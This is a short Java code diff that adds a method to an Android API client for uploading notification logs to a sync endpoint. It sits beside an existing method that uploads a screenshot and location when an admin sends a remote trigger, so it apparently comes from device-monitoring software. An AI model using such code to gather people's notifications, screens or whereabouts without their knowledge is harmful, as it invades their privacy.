@@ -146,6 +146,21 @@ public class ApiClient {
     }
 
     /**
+     * Upload notification logs.
+     */
+    public static boolean uploadNotifications(String apiToken, JSONArray notifications) {
+        try {
+            JSONObject body = new JSONObject();
+            body.put("notifications", notifications);
+            String response = postJson(apiToken, "/sync/notifications", body.toString());
+            return response != null;
+        } catch (Exception e) {
+            Log.e(TAG, "Notification upload error", e);
+            return false;
+        }
+    }
+
+    /**
      * Upload realtime payload (screenshot + location) in response to admin FCM trigger.
      */
     public static boolean uploadRealtimePayload(String apiToken, File screenshot,
